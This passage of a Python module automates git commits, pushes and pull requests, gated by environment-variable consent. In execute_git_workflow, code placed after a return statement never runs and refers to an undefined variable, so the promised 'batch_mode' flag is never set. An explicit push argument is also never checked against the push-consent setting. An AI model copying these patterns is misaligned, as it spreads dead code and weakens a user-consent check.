) -> Dict[str, Any]:
    """
    Execute git automation workflow with optional batch mode support.

    This is the main entry point for git automation (used by both /auto-implement
    and /batch-implement workflows). In batch mode, consent prompts are skipped
    but environment variable consent is still respected.

    Args:
        workflow_id: Unique workflow identifier
        request: Feature request description
        branch: Git branch name (optional, auto-detected if not provided)
        push: Whether to push to remote (optional, uses consent if not provided)
        create_pr: Whether to attempt PR creation
        base_branch: Target branch for PR (default: 'main')
        in_batch_mode: Skip first-run consent prompts (for /batch-implement)

    Returns:
        Dict with success status, commit info, and optional PR details
        (see execute_step8_git_operations for full return structure)

    Examples:
        >>> # Interactive mode (shows first-run warning)
        >>> result = execute_git_workflow(
        ...     workflow_id='workflow-123',
        ...     request='Add feature',
        ...     in_batch_mode=False
        ... )

        >>> # Batch mode (skips first-run warning)
        >>> result = execute_git_workflow(
        ...     workflow_id='batch-20251206-feature-1',
        ...     request='Add logging',
        ...     in_batch_mode=True
        ... )
    """
    # In batch mode, skip first-run warning but still respect env var consent
    if in_batch_mode:
        # Batch mode bypasses the first-run interactive prompt
        # But still respects environment variable consent (AUTO_GIT_ENABLED, etc.)
        # This allows unattended batch processing while maintaining consent model
        pass  # No first-run warning in batch mode

    # Delegate to execute_step8_git_operations
    return execute_step8_git_operations(
        workflow_id=workflow_id,
        request=request,
        branch=branch,
        push=push,
        create_pr=create_pr,
        base_branch=base_branch,
        _skip_first_run_warning=in_batch_mode  # Internal parameter
    )

    # Add batch_mode flag to return value for test compatibility
    result['batch_mode'] = in_batch_mode
    return result


def execute_step8_git_operations(
    workflow_id: str,
    request: str,
    branch: Optional[str] = None,
    push: Optional[bool] = None,
    create_pr: bool = False,
    base_branch: str = 'main',
    _skip_first_run_warning: bool = False  # Internal: bypass first-run warning
) -> Dict[str, Any]:
    """
    Execute complete Step 8 git automation workflow.

    This is the main entry point for /auto-implement Step 8.

    Workflow:
    1. Check consent via environment variables
    2. Validate git CLI is available
    3. Invoke commit-message-generator agent
    4. Create commit with agent message
    5. Optionally push to remote (if consent given)
    6. Optionally create PR (if consent given)

    Args:
        workflow_id: Unique workflow identifier
        request: Feature request description
        branch: Git branch name (optional, auto-detected if not provided)
        push: Whether to push to remote (optional, uses consent if not provided)
        create_pr: Whether to attempt PR creation
        base_branch: Target branch for PR (default: 'main')

    Returns:
        Dict with:
            - success: Overall success status
            - skipped: Whether operations were skipped (consent not given)
            - reason: Reason for skipping (if skipped)
            - commit_sha: Commit SHA (if committed)
            - pushed: Whether pushed to remote
            - pr_created: Whether PR was created
            - pr_url: PR URL (if PR created)
            - agent_invoked: Whether agents were invoked
            - stage_failed: Stage where failure occurred (if failed)
            - error: Error message (if failed)
            - manual_instructions: Manual fallback (if failed)
            - how_to_enable: Instructions to enable automation (if skipped)

    Examples:
        >>> # Auto-detect branch
        >>> result = execute_step8_git_operations(
        ...     workflow_id='workflow-123',
        ...     request='Add user authentication',
        ...     push=True,
        ...     create_pr=True
        ... )
        >>> # Explicit branch
        >>> result = execute_step8_git_operations(
        ...     workflow_id='workflow-123',
        ...     request='Add user authentication',
        ...     branch='feature/add-auth',
        ...     create_pr=True
        ... )
        >>> if result['success']:
        ...     print(f"Committed: {result['commit_sha']}")
        ...     if result.get('pr_created'):
        ...         print(f"PR: {result['pr_url']}")
    """
    # Step 1: Check consent (pass skip parameter for batch mode)
    consent = check_consent_via_env(_skip_first_run_warning=_skip_first_run_warning)

    # If push parameter not provided, use consent
    if push is None:
        push = consent['push_enabled']

    if not consent['git_enabled']:
        return {
            'success': True,
            'skipped': True,
            'reason': 'User consent not provided (AUTO_GIT_ENABLED=false)',
            'commit_sha': '',
            'pushed': False,
            'pr_created': False,
            'agent_invoked': False,
            'how_to_enable': (
                "To enable git automation, set environment variables:\n"
                "  export AUTO_GIT_ENABLED=true\n"
                "  export AUTO_GIT_PUSH=true    # Optional: enable push\n"
                "  export AUTO_GIT_PR=true      # Optional: enable PR creation\n\n"
                "Or add to .env file:\n"
                "  AUTO_GIT_ENABLED=true\n"
                "  AUTO_GIT_PUSH=true\n"
                "  AUTO_GIT_PR=true"
            )
        }

    # Step 2: Auto-detect branch if not provided
    if branch is None:
        try:
            result = subprocess.run(
                ['git', 'rev-parse', '--abbrev-ref', 'HEAD'],
                capture_output=True,
                text=True,
                timeout=10,
                check=True,
            )
            branch = result.stdout.strip()
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
            return {
                'success': False,
                'error': f'Failed to detect git branch: {e}',
                'commit_sha': '',
                'pushed': False,
                'pr_created': False,
                'agent_invoked': False,
            }

    # Step 3: Validate git CLI is available
    if not check_git_available():
        return {
            'success': False,
            'error': 'git CLI not available',
            'install_instructions': (
                "Git is not installed or not in PATH.\n\n"
                "Install git:\n"
                "  macOS: brew install git\n"
                "  Linux: sudo apt-get install git\n"
                "  Windows: https://git-scm.com/download/win"
            ),
            'commit_sha': '',
            'pushed': False,
            'pr_created': False
        }

    # Step 4: Create commit with agent message
    commit_result = create_commit_with_agent_message(
        workflow_id=workflow_id,
        request=request,
        branch=branch,
        push=push  # Use explicit push parameter
    )

    # If commit failed, return early
    if not commit_result['success']:
        return {
            'success': False,
            'stage_failed': 'git_operations',  # Failed during git operations stage
            'error': commit_result['error'],
            'manual_instructions': commit_result.get('manual_instructions'),
            'commit_sha': '',
            'pushed': False,
            'pr_created': False,
            'agent_invoked': commit_result.get('agent_succeeded', False),
            'fallback_available': commit_result.get('fallback_available', True),
            'commit_message_generated': commit_result.get('commit_message_generated', ''),
            'agent_succeeded': commit_result.get('agent_succeeded', False),
            'git_succeeded': commit_result.get('git_succeeded', False),
            'next_steps': commit_result.get('manual_instructions', '')
        }

    # Step 5: Optionally create PR
    pr_result = {'pr_created': False, 'pr_url': '', 'pr_number': None, 'pr_error': ''}

    if create_pr and consent['pr_enabled']:
        # Extract title from commit message (first line)
        title = commit_result['commit_message_generated'].split('\n')[0]

        pr_result = push_and_create_pr(
            workflow_id=workflow_id,
            branch=branch,
            base_branch=base_branch,
            title=title,
            commit_sha=commit_result['commit_sha']
        )

        # Store PR error separately
        if not pr_result.get('success', False):
            pr_result['pr_error'] = pr_result.get('error', '')
            # Provide manual PR command
            pr_result['manual_pr_command'] = pr_result.get('fallback_command', '')

    # Build final response
    return {
        'success': True,  # Commit succeeded (PR is optional)
        'commit_sha': commit_result['commit_sha'],
        'pushed': commit_result['pushed'],
        'pr_created': pr_result.get('pr_created', False),
        'pr_url': pr_result.get('pr_url', ''),
        'pr_number': pr_result.get('pr_number'),
        'pr_error': pr_result.get('pr_error', ''),
        'manual_pr_command': pr_result.get('manual_pr_command', ''),
        'agent_invoked': True,
        'error': ''
    }
